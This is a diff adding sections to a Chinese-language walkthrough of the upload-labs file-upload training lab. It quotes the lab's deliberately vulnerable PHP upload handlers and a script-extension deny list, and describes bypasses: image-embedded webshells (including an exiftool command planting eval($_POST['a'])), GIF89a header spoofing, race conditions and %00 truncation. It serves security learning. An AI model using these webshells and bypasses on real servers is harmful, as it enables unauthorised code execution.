@@ -635,9 +635,15 @@ Deny from all
 
 制作图片马cmd下运行copy 1.jpg /b 2.php /a 3.jpg，上传绕过检测，然后构造payroad：http://127.0.0.1:8080/include.php?file=upload/3.jpg
 
-**补充**
+**补充**  
 
-制作图片马时可以把木马放在图片的comment中，用exiftool工具
+还有两个方法：
+
+1.上传1.php然后bp抓包在内容前面加GIF89a（文件头），然后利用文件包含漏洞构造payload
+
+<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200317182448.png" width="60%">
+
+2.制作图片马时可以把木马放在图片的comment中，用exiftool工具
 
 	exiftool "-comment=<?php echo 'hello world';eval($_POST['a']); ?>" 4.jpg
 结果如下
@@ -646,7 +652,297 @@ Deny from all
 
 <img src="https://raw.githubusercontent.com/picgouser/pic/master/20200317023346.png" width="60%">
 
+##Pass-15
 
+漏洞点为服务端--检查内容--突破getimagesize()
 
+源码
 
+	function isImage($filename){
+	    $types = '.jpeg|.png|.gif';
+	    if(file_exists($filename)){
+	        $info = getimagesize($filename);
+	        $ext = image_type_to_extension($info[2]);
+	        if(stripos($types,$ext)>=0){
+	            return $ext;
+	        }else{
+	            return false;
+	        }
+	    }else{
+	        return false;
+	    }
+	}
+	
+	$is_upload = false;
+	$msg = null;
+	if(isset($_POST['submit'])){
+	    $temp_file = $_FILES['upload_file']['tmp_name'];
+	    $res = isImage($temp_file);
+	    if(!$res){
+	        $msg = "文件未知，上传失败！";
+	    }else{
+	        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
+	        if(move_uploaded_file($temp_file,$img_path)){
+	            $is_upload = true;
+	        } else {
+	            $msg = "上传出错！";
+	        }
+	    }
+	}
 
+利用方式：这里用getimagesize()获取文件信息，该函数也只是进行文件头的检查，利用方式和Pass-14一样
+
+##Pass-16
+
+漏洞点为服务端--检查内容--突破exif_imagetype()
+
+源码
+
+	function isImage($filename){
+	    //需要开启php_exif模块
+	    $image_type = exif_imagetype($filename);
+	    switch ($image_type) {
+	        case IMAGETYPE_GIF:
+	            return "gif";
+	            break;
+	        case IMAGETYPE_JPEG:
+	            return "jpg";
+	            break;
+	        case IMAGETYPE_PNG:
+	            return "png";
+	            break;    
+	        default:
+	            return false;
+	            break;
+	    }
+	}
+	
+	$is_upload = false;
+	$msg = null;
+	if(isset($_POST['submit'])){
+	    $temp_file = $_FILES['upload_file']['tmp_name'];
+	    $res = isImage($temp_file);
+	    if(!$res){
+	        $msg = "文件未知，上传失败！";
+	    }else{
+	        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
+	        if(move_uploaded_file($temp_file,$img_path)){
+	            $is_upload = true;
+	        } else {
+	            $msg = "上传出错！";
+	        }
+	    }
+	}
+
+利用方式：这里用exif_imagetype()获取文件信息，该函数也只是进行文件头的检查，利用方式和Pass-14一样
+
+##Pass-17
+
+漏洞点为服务端--检查内容--二次渲染
+
+这个比较复杂可以参考[https://xz.aliyun.com/t/2657#toc-13](https://xz.aliyun.com/t/2657#toc-13)
+
+##Pass-18
+
+漏洞点为服务端--代码逻辑--条件竞争
+
+源码
+
+	$is_upload = false;
+	$msg = null;
+	
+	if(isset($_POST['submit'])){
+	    $ext_arr = array('jpg','png','gif');
+	    $file_name = $_FILES['upload_file']['name'];
+	    $temp_file = $_FILES['upload_file']['tmp_name'];
+	    $file_ext = substr($file_name,strrpos($file_name,".")+1);
+	    $upload_file = UPLOAD_PATH . '/' . $file_name;
+	
+	    if(move_uploaded_file($temp_file, $upload_file)){
+	        if(in_array($file_ext,$ext_arr)){
+	             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
+	             rename($upload_file, $img_path);
+	             $is_upload = true;
+	        }else{
+	            $msg = "只允许上传.jpg|.png|.gif类型文件！";
+	            unlink($upload_file);
+	        }
+	    }else{
+	        $msg = '上传出错！';
+	    }
+	}
+
+因为文件上传后先放在一个临时位置再判断是否合法，所以可以在文件存在临时位置，未被删除的瞬间访问。<del>这样的手速反正我是没有，</del>据说是用bp几十上百线程发送数据包过去然后趁服务器不注意就访问
+
+##Pass-19
+
+漏洞点为服务端--代码逻辑--条件竞争
+
+	//index.php
+	$is_upload = false;
+	$msg = null;
+	if (isset($_POST['submit']))
+	{
+	    require_once("./myupload.php");
+	    $imgFileName =time();
+	    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
+	    $status_code = $u->upload(UPLOAD_PATH);
+	    switch ($status_code) {
+	        case 1:
+	            $is_upload = true;
+	            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
+	            break;
+	        case 2:
+	            $msg = '文件已经被上传，但没有重命名。';
+	            break; 
+	        case -1:
+	            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
+	            break; 
+	        case -2:
+	            $msg = '上传失败，上传目录不可写。';
+	            break; 
+	        case -3:
+	            $msg = '上传失败，无法上传该类型文件。';
+	            break; 
+	        case -4:
+	            $msg = '上传失败，上传的文件过大。';
+	            break; 
+	        case -5:
+	            $msg = '上传失败，服务器已经存在相同名称文件。';
+	            break; 
+	        case -6:
+	            $msg = '文件无法上传，文件不能复制到目标目录。';
+	            break;      
+	        default:
+	            $msg = '未知错误！';
+	            break;
+	    }
+	}
+	
+	//myupload.php
+	class MyUpload{
+	......
+	......
+	...... 
+	  var $cls_arr_ext_accepted = array(
+	      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
+	      ".html", ".xml", ".tiff", ".jpeg", ".png" );
+	
+	......
+	......
+	......  
+	  /** upload()
+	   **
+	   ** Method to upload the file.
+	   ** This is the only method to call outside the class.
+	   ** @para String name of directory we upload to
+	   ** @returns void
+	  **/
+	  function upload( $dir ){
+	    
+	    $ret = $this->isUploadedFile();
+	    
+	    if( $ret != 1 ){
+	      return $this->resultUpload( $ret );
+	    }
+	
+	    $ret = $this->setDir( $dir );
+	    if( $ret != 1 ){
+	      return $this->resultUpload( $ret );
+	    }
+	
+	    $ret = $this->checkExtension();
+	    if( $ret != 1 ){
+	      return $this->resultUpload( $ret );
+	    }
+	
+	    $ret = $this->checkSize();
+	    if( $ret != 1 ){
+	      return $this->resultUpload( $ret );    
+	    }
+	    
+	    // if flag to check if the file exists is set to 1
+	    
+	    if( $this->cls_file_exists == 1 ){
+	      
+	      $ret = $this->checkFileExists();
+	      if( $ret != 1 ){
+	        return $this->resultUpload( $ret );    
+	      }
+	    }
+	
+	    // if we are here, we are ready to move the file to destination
+	
+	    $ret = $this->move();
+	    if( $ret != 1 ){
+	      return $this->resultUpload( $ret );    
+	    }
+	
+	    // check if we need to rename the file
+	
+	    if( $this->cls_rename_file == 1 ){
+	      $ret = $this->renameFile();
+	      if( $ret != 1 ){
+	        return $this->resultUpload( $ret );    
+	      }
+	    }
+	    
+	    // if we are here, everything worked as planned :)
+	
+	    return $this->resultUpload( "SUCCESS" );
+	  
+	  }
+	......
+	......
+	...... 
+	};
+
+代码的意思是先判断上传的文件是否合法，合法的话就二次包装，使得文件面目全非（使我们不知道文件名从而无法访问），利用方法是上传图片马然后继续拼手速<del>哈哈哈真刺激</del>
+
+##Pass-20
+
+这里还是00截断
+
+源码
+
+	$is_upload = false;
+	$msg = null;
+	if (isset($_POST['submit'])) {
+	    if (file_exists(UPLOAD_PATH)) {
+	        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
+	
+	        $file_name = $_POST['save_name'];
+	        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+	
+	        if(!in_array($file_ext,$deny_ext)) {
+	            $temp_file = $_FILES['upload_file']['tmp_name'];
+	            $img_path = UPLOAD_PATH . '/' .$file_name;
+	            if (move_uploaded_file($temp_file, $img_path)) { 
+	                $is_upload = true;
+	            }else{
+	                $msg = '上传出错！';
+	            }
+	        }else{
+	            $msg = '禁止保存为该类型文件！';
+	        }
+	
+	    } else {
+	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+	    }
+	}
+
+方法比较简单，上传1.php然后bp抓包把后缀改成php然后用%00截断就行
+
+##Pass-21
+
+Pass-21逻辑性很强可以细细分析，主要思路是利用数组
+
+##尾言
+
+参考来自  
+[http://hed9eh0g.top/?p=46](http://hed9eh0g.top/?p=46)  
+[http://lz2y.top/index.php/2020/01/upload-labs-writeup2/](http://lz2y.top/index.php/2020/01/upload-labs-writeup2/)  
+[https://www.jianshu.com/p/aabc1e7408d5](https://www.jianshu.com/p/aabc1e7408d5)  
+[http://www.mo60.cn/post-42.html](http://www.mo60.cn/post-42.html)  
+[https://www.cnblogs.com/hack404/p/10385049.html](https://www.cnblogs.com/hack404/p/10385049.html)  
+[https://bbs.ichunqiu.com/thread-43510-1-6.html](https://bbs.ichunqiu.com/thread-43510-1-6.html)
